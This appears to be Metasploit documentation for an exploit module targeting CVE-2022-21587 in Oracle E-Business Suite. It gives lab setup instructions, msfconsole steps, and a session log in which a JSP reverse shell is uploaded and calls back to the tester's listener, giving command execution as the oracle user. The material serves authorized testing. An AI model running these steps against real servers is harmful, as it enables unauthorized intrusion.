## Vulnerable Application

This module exploits CVE-2022-21587, an unauthenticated arbitrary file upload vulnerability in Oracle
Web Applications Desktop Integrator as shipped with Oracle E-Business Suite (EBS) versions
12.2.3 through to 12.2.11.

The exploit uploads a Java Server Page (JSP) payload in order to achieve code execution
as the `oracle` user, and will use the `java/jsp_shell_reverse_tcp` payload by default.

The Oracle EBS product is shipped as either a standalone appliance based on Linux, or an self
hosted application supporting multiple platforms, including Linux, Windows, Solaris, AIX and
HP-UP. This exploit module has been tested against the Linux based appliance, specifically
version 12.2.10.

A full technical analysis of the vulnerability can be found on
[AttackerKB](https://attackerkb.com/topics/Bkij5kK1qK/cve-2022-21587/rapid7-analysis).

## Target Setup

To setup the Oracle EBS appliance, you must download the appliance files, rebuild the appliance
image and install the appliance as a [VirtualBox](https://www.virtualbox.org/) virtual machine.

* Register an account at [Oracle E-Delivery](https://edelivery.oracle.com/osdc/faces/SoftwareDelivery)
and login to search for the required software. You will need to search for `REL: Oracle VM Virtual Appliance for
Oracle E-Business Suite` to find the appropriate download links. The version number should be listed at the end of the link.

* You will be presented with multiple ZIP files to download. These files will be extracted and
concatenated to create a single 70 GB Oracle Virtual Appliance (OVA) file. Instructions on how
to do this, as well as additional configuration instructions, can be found in the extracted
documentation located in `\V1005962-01\Documents\Oracle VM Virtual Appliance for Oracle E-Business
Suite Deployment Guide_Release 12.2.10.html`. Additionally a step by step guide for installation
and setup is available [here](https://blog.rishoradev.com/2021/04/12/oracle-ebs-r12-on-virtualbox/).

* Import the OVA file into VirtualBox. Once this is completed you may power on the virtual appliance.
You will require around 320 GB of hard disk space to complete this operation. Note, issues were encountered
if the IP address for the appliance changed after the initial install. It is recommended to use either a
static IP address or ensure your DHCP server provides the same address to the appliance.

* When booting the virtual appliance you will be asked to select a Linux kernel to boot from. The option
`Oracle Linux Server 7.9, with Linux 3.10.0-1160.11.1.e17.x86_64` was chosen during testing.

* Upon booting the virtual appliance for the first time you will be asked to login. Enter the username `root`
and follow the instructions displayed in the console to set the default passwords for the `root` and
`oracle` and `applmgr` user accounts. If asked to install the VISION demo instance, enter `VISION` to install
the demo data.

* Once installation and setup has been completed, you can SSH into the appliance as the user
`oracle` and start the database and application services with the following commands. Note, it has been observed that
when starting the apps, some may timeout when starting (an error will be displayed in the console), and may require
running `startapps.sh` a second time.

```
cd /u01/install/APPS/scripts/
./startdb.sh
./startapps.sh
```

* You can now access the WebLogic server over HTTP port `8000`.

## Options

## Verification Steps

From msfconsole perform the following steps:

1. `use exploit/linux/http/oracle_ebs_rce_cve_2022_21587`
2. Set `RHOST` to the target address and `RPORT` to the target port. The default `RPORT` is 8000 for
HTTP and 4443 for HTTPS. If using HTTPS set `SSL` to `true`.
3. Set `LHOST` and `LPORT` values for the default `java/jsp_shell_reverse_tcp` payload.
4. `check` to ensure the target is vulnerable.
5. `exploit`
6. Verify a command session has been opened and you can execute commands as the `oracle` user.

## Scenarios

### Oracle E-Business Suite 12.2.10 - Oracle Virtual Appliance (OVA)

```
msf6 > use exploit/linux/http/oracle_ebs_rce_cve_2022_21587 
[*] Using configured payload java/jsp_shell_reverse_tcp
msf6 exploit(linux/http/oracle_ebs_rce_cve_2022_21587) > show options

Module options (exploit/linux/http/oracle_ebs_rce_cve_2022_21587):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl
                                       oit/basics/using-metasploit.html
   RPORT    8000             yes       The target port (TCP)
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Payload options (java/jsp_shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
   SHELL                   no        The system shell to use.


Exploit target:

   Id  Name
   --  ----
   0   Oracle EBS on Linux



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/oracle_ebs_rce_cve_2022_21587) > set RHOST 192.168.86.37
RHOST => 192.168.86.37
msf6 exploit(linux/http/oracle_ebs_rce_cve_2022_21587) > set LHOST 192.168.86.5
LHOST => 192.168.86.5
msf6 exploit(linux/http/oracle_ebs_rce_cve_2022_21587) > check
[*] 192.168.86.37:8000 - The target appears to be vulnerable. Oracle EBS version 12.2.10 detected.
msf6 exploit(linux/http/oracle_ebs_rce_cve_2022_21587) > exploit

[*] Started reverse TCP handler on 192.168.86.5:4444 
[*] Targeting the endpoint: /OA_HTML/BneUploaderService
[*] Triggering the payload...
[+] Deleted /u01/install/APPS/fs1/FMW_Home/Oracle_EBS-app1/applications/forms/forms/ygrne.jsp
[*] Command shell session 1 opened (192.168.86.5:4444 -> 192.168.86.37:59288) at 2023-02-10 12:20:43 +0000

id
uid=54321(oracle) gid=54321(oinstall) groups=54321(oinstall),54322(dba) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
uname -a
Linux apps 3.10.0-1160.11.1.el7.x86_64 #1 SMP Tue Dec 15 11:58:45 PST 2020 x86_64 x86_64 x86_64 GNU/Linux
exit
[*] 192.168.86.37 - Command shell session 1 closed.
msf6 exploit(linux/http/oracle_ebs_rce_cve_2022_21587) >
```
